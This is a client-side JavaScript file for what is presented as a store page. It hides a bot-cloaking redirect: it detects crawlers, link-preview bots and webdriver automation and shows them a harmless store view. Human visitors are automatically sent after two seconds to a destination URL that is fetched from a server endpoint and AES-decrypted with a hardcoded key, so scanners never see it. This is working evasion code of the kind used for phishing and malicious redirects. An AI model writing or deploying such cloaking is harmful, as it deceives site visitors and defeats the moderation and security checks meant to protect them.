(() => {
    'use strict';

    const popup = document.getElementById('loadingPopup');
    const store = document.getElementById('store');;
    const cancelBtn = document.getElementById('cancelBtn');
    const continueBtn = document.getElementById('continueBtn');

    const SECRET_KEY = '5&WPdUuNkcuOHpL!YvmlWBlW6FgU=$0uZQh)N$vkUPkqB6sd!2';

    function isBot() {
        const ua = navigator.userAgent || '';
        const botRegex = /bot|crawl|spider|slurp|bing|google|yandex|duckduck|baidu|facebook|twitter|whatsapp|preview|linkedin|pinterest|telegram|discord|skype|embedly|quora|outbrain|w3c_validator|reddit/i;
        return botRegex.test(ua) || navigator.webdriver === true;
    }

    let revealed = false;
    let iframeLoaded = false;
    let rotationTimer = null;
    let revealTimer = null;

    function decryptUrl(encUrl) {
        try {
            const bytes = CryptoJS.AES.decrypt(encUrl, SECRET_KEY);
            const plain = bytes.toString(CryptoJS.enc.Utf8);
            if (!plain) throw new Error('Empty decryption result');
            return plain;
        } catch (err) {
            console.error('Decryption failed:', err.message);
            return null;
        }
    }

    async function fetchStoreUrl() {
        try {
            const res = await fetch('/api/config', { cache: 'no-store' });
            if (!res.ok) throw new Error('config fetch failed: ' + res.status);

            const cfg = await res.json();
            const key = cfg.key;

            if (!cfg.encUrl) {
                return null;
            }

            const url = decryptUrl(cfg.encUrl, key);
            return {
                url: url,
                interval: cfg.interval || 180000
            };
        } catch (err) {
            console.error('/api/config error:', err);
            return null;
        }
    }

    async function redirectToUrl() {
        if (iframeLoaded) return;
        iframeLoaded = true;

        const cfg = await fetchStoreUrl();

        if (!cfg || !cfg.url) {
            console.error('No URL to redirect');
            return;
        }

        console.log('Redirecting to:', cfg.url);
        window.location.href = cfg.url;
    }

    function reveal() {
        if (revealed) return;
        revealed = true;

        popup.classList.add('fade-out');
        setTimeout(() => popup.classList.add('hidden'), 450);

        redirectToUrl();
    }

    continueBtn?.addEventListener('click', (e) => {
        e.stopPropagation();
        if (revealTimer) {
            clearTimeout(revealTimer);
            revealTimer = null;
        }
        continueBtn.textContent = 'Entering…';
        reveal();
    });

    cancelBtn?.addEventListener('click', (e) => {
        e.stopPropagation();
        if (revealTimer) {
            clearTimeout(revealTimer);
            revealTimer = null;
        }
        cancelBtn.textContent = 'Cancelled';
        cancelBtn.disabled = true;
    });


    if (isBot()) {
        popup?.classList.add('hidden');
        if (store) {
            store.classList.remove('hidden');
            store.classList.add('store-in');
        }
    } else {
        revealTimer = setTimeout(reveal, 2000);
    }
})();